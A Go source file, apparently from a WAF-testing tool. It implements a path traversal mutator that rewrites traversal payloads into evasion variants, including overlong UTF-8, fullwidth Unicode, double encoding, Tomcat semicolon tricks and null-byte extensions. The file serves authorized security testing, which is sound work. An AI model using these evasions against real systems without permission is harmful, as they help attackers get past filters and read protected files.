// Package strategies provides mutation strategies for WAF bypass testing.
// SECURITY NOTE: This file contains path traversal test payloads for authorized
// penetration testing purposes. These patterns are used to test WAF rule coverage
// and should only be used against systems you have permission to test.
package strategies

import (
	"strings"
)

// PathTraversalMutator applies mutations specific to path traversal encoding evasion
type PathTraversalMutator struct{}

// NewPathTraversalMutator creates a new path traversal mutator
func NewPathTraversalMutator() *PathTraversalMutator {
	return &PathTraversalMutator{}
}

// Mutate applies path traversal-specific mutations
func (p *PathTraversalMutator) Mutate(payload string) []MutationResult {
	var results []MutationResult

	results = append(results, MutationResult{
		Payload:     p.fullwidthDotsSlashes(payload),
		Mutation:    "fullwidth_dots_slashes",
		Description: "Replace dots and slashes with fullwidth Unicode equivalents",
	})

	results = append(results, MutationResult{
		Payload:     p.mixedOverlongUTF8(payload),
		Mutation:    "mixed_overlong_traversal",
		Description: "Replace traversal sequences with overlong UTF-8 encoding",
	})

	results = append(results, MutationResult{
		Payload:     p.duplicationBypass(payload),
		Mutation:    "traversal_duplication",
		Description: "Duplicate traversal characters to defeat single-pass stripping",
	})

	results = append(results, MutationResult{
		Payload:     p.tomcatSemicolon(payload),
		Mutation:    "tomcat_semicolon_traversal",
		Description: "Insert semicolon path parameter delimiter for Tomcat bypass",
	})

	results = append(results, MutationResult{
		Payload:     p.backslashVariation(payload),
		Mutation:    "backslash_traversal",
		Description: "Replace forward slashes with backslashes for Windows-style traversal",
	})

	results = append(results, MutationResult{
		Payload:     p.mixedSlashes(payload),
		Mutation:    "mixed_slash_traversal",
		Description: "Alternate between forward and backslashes",
	})

	results = append(results, MutationResult{
		Payload:     p.doubleEncoded(payload),
		Mutation:    "double_encoded_traversal",
		Description: "Double URL-encode dots and slashes",
	})

	results = append(results, MutationResult{
		Payload:     p.nullByteTermination(payload),
		Mutation:    "null_byte_filename",
		Description: "Append null byte with fake file extension",
	})

	results = append(results, MutationResult{
		Payload:     p.dotSegmentVariations(payload),
		Mutation:    "dot_segment_variations",
		Description: "Insert redundant current-directory references in traversal",
	})

	results = append(results, MutationResult{
		Payload:     p.utf8OverlongDotOnly(payload),
		Mutation:    "utf8_overlong_dot_only",
		Description: "Replace dots with overlong UTF-8 encoding but leave slashes intact",
	})

	return results
}

// fullwidthDotsSlashes replaces . with fullwidth full stop and / with fullwidth solidus
func (p *PathTraversalMutator) fullwidthDotsSlashes(payload string) string {
	result := strings.ReplaceAll(payload, ".", string(rune(0xFF0E)))
	result = strings.ReplaceAll(result, "/", string(rune(0xFF0F)))
	return result
}

// mixedOverlongUTF8 replaces traversal sequences with overlong UTF-8 encoded equivalents
func (p *PathTraversalMutator) mixedOverlongUTF8(payload string) string {
	result := strings.ReplaceAll(payload, "../", "%c0%ae%c0%ae%c0%af")
	result = strings.ReplaceAll(result, ".", "%c0%ae")
	result = strings.ReplaceAll(result, "/", "%c0%af")
	return result
}

// duplicationBypass replaces ../ with ....// to defeat single-pass WAF stripping
func (p *PathTraversalMutator) duplicationBypass(payload string) string {
	return strings.ReplaceAll(payload, "../", "....//")
}

// tomcatSemicolon replaces ../ with ..; for Tomcat path parameter delimiter bypass
func (p *PathTraversalMutator) tomcatSemicolon(payload string) string {
	return strings.ReplaceAll(payload, "../", "..;/")
}

// backslashVariation replaces all forward slashes with backslashes
func (p *PathTraversalMutator) backslashVariation(payload string) string {
	return strings.ReplaceAll(payload, "/", "\\")
}

// mixedSlashes alternates between forward and backslashes
func (p *PathTraversalMutator) mixedSlashes(payload string) string {
	var result strings.Builder
	slashCount := 0
	for _, ch := range payload {
		if ch == '/' {
			if slashCount%2 == 0 {
				result.WriteRune('/')
			} else {
				result.WriteRune('\\')
			}
			slashCount++
		} else {
			result.WriteRune(ch)
		}
	}
	return result.String()
}

// doubleEncoded applies double URL-encoding to dots and slashes
func (p *PathTraversalMutator) doubleEncoded(payload string) string {
	result := strings.ReplaceAll(payload, ".", "%252e")
	result = strings.ReplaceAll(result, "/", "%252f")
	return result
}

// nullByteTermination appends a null byte with a fake .png extension
func (p *PathTraversalMutator) nullByteTermination(payload string) string {
	return payload + "%00.png"
}

// dotSegmentVariations replaces ../ with ./../ adding redundant current-directory references
func (p *PathTraversalMutator) dotSegmentVariations(payload string) string {
	return strings.ReplaceAll(payload, "../", "./../")
}

// utf8OverlongDotOnly replaces dots with overlong UTF-8 encoding but leaves slashes intact
func (p *PathTraversalMutator) utf8OverlongDotOnly(payload string) string {
	return strings.ReplaceAll(payload, ".", "%c0%ae")
}
